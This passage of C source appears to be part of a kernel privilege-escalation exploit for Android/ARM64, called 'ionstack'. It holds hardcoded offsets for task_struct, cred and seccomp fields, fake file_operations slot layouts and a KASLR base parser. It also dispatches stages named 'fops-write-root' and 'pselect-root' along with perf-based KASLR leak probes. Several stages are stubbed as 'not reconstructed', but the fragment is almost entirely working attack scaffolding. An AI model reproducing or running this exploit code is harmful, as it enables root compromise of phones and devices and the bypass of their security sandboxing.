        printf("\x1B[32m[+] \x1B[0mdry text ashmem llseek=%016llx read_iter=%016llx ioctl=%016llx compat_ioctl=%016llx mmap=%016llx open=%016llx release=%016llx show_fdinfo=%016llx\n",
               v[0], v[1], v[2], v[3], v[4], v[5], v[6], v[7]);
        unsigned long long fr = text_addr(*(unsigned long long *)(g_ionstack_dev + 240) + K);
        unsigned long long fw = text_addr(*(unsigned long long *)(g_ionstack_dev + 248) + K);
        unsigned long long fs = text_addr(*(unsigned long long *)(g_ionstack_dev + 264) + K);
        unsigned long long fl = text_addr(*(unsigned long long *)(g_ionstack_dev + 272) + K);
        printf("\x1B[32m[+] \x1B[0mdry fake_fops_slots read@%x=%016llx write@%x=%016llx read_iter@%x=0 write_iter@%x=0 splice_read@%x=%016llx llseek_repair=%016llx\n",
               16, fr, 24, fw, 32, 40, 200, fs, fl);
        printf("\x1B[32m[+] \x1B[0mdry task_offsets tasks=%x pid=%x tgid=%x atomic_flags=%x cred=%x real_cred=%x comm=%x seccomp=%x pi_lock=%x pi_blocked_on=%x\n",
               1216, 1472, 1476, 1416, 1912, 1904, 1928, 2096, 2132, 2176);
        printf("\x1B[32m[+] \x1B[0mdry cred_seccomp_offsets uid=%x securebits=%x caps=%x security=%x seccomp_mode=%x seccomp_filter=%x have_count=%d selinux_blob_sizes=%d blob_off=%x\n",
               4, 36, 40, 120, 0, 8, 1, 0, 0);
        return 0;
    }

    e = getenv("IONSTACK_KASLR_BASE");
    int kaslr_env = 1; 
    if (e && *e) {
        char *end = NULL;
        errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (errno || !end || *end || !is_kernel_ptr(v) || (v & 0xFFF) != 0) {
            printf("\x1B[31m[!] \x1B[0minvalid IONSTACK_KASLR_BASE=%s\n", e);
            exit(-1);
        }
        unsigned long long slide = 0xFFFFFFC008000000ull - v;
        if (v >= 0xFFFFFFC008000000ull) slide = v + 0x3FF8000000ull;
        if (slide >> 39) {
            printf("\x1B[31m[!] \x1B[0mIONSTACK_KASLR_BASE slide invalid base=%016zx slide=%016zx (expected 4K alignment and 39-bit range)\n",
                   v, v + 0x3FF8000000ull);
            exit(-1);
        }
        kaslr_base = v;
        kaslr_slide = v + 0x3FF8000000ull;
        kaslr_done = 1;
        printf("\x1B[32m[+] \x1B[0mkaslr-external-ok pid=%d base=%016llx slide=%016llx source=IONSTACK_KASLR_BASE\n",
               getpid(), kaslr_base, kaslr_slide);
        kaslr_env = 0;
    }

    if (ionstack_stage_is("slide-page")) return stage_not_reconstructed("slide-page");
    if (ionstack_stage_is("slide-page-hold")) return stage_not_reconstructed("slide-page-hold");
    if (ionstack_stage_is("fops-page")) return stage_not_reconstructed("fops-page");
    if (ionstack_stage_is("fops-page-hold")) return stage_not_reconstructed("fops-page-hold");
    if (ionstack_stage_is("fops-check")) return stage_not_reconstructed("fops-check");
    if (ionstack_stage_is("fops-write-root")) return stage_not_reconstructed("fops-write-root");
    if (ionstack_stage_is("pselect-root")) {
        pin_to_core(0);
        if (kaslr_done) return stage_not_reconstructed("pselect-root");
        puts("\x1B[31m[!] \x1B[0mpselect-root requires external or leaked KASLR base");
        exit(-1);
    }
    if (ionstack_stage_is("fops-page-validate")) return stage_not_reconstructed("fops-page-validate");
    if (ionstack_stage_is("fops-stack-scan")) return stage_not_reconstructed("fops-stack-scan");
    if (ionstack_stage_is("ks-probe")) {
        long long mm = run_kernelsnitch_probe_once();
        printf("\x1B[32m[+] \x1B[0mstage-ks-probe-result pid=%d ok=%d mm=%016zx\n", getpid(), mm != -1, mm);
        return mm == -1;
    }
    if (ionstack_stage_is("perf-slide")) {
        int ok = slide_perf_leak_kernel_base_route();
        printf("\x1B[32m[+] \x1B[0mstage-perf-slide-result pid=%d ok=%d base=%016zx slide=%016zx\n",
               getpid(), ok, kaslr_base, kaslr_slide);
        return ok == 0;
    }

    
    pin_to_core(0);
    if (!kaslr_env || slide_leak_kernel_base()) {
        if (getenv("IONSTACK_VERIFY_PERF")) {
            unsigned long long cand = slide_perf_leak_kernel_base();
            printf("\x1B[32m[+] \x1B[0mslide-perf-verify confirmed_base=%016llx perf_candidate=%016llx match=%d\n",
                   kaslr_base, cand, cand == kaslr_base);
        }
        if (ionstack_stage_is("slide")) {
            printf("\x1B[32m[+] \x1B[0mstage-slide-result pid=%d ok=1 base=%016zx slide=%016zx\n",
                   getpid(), kaslr_base, kaslr_slide);
            return 0;
        }
        return stage_not_reconstructed(ionstack_stage ? ionstack_stage : "full");
    }
    puts("\x1B[31m[!] \x1B[0mslide kaslr leak failed");
    exit(-1);
}
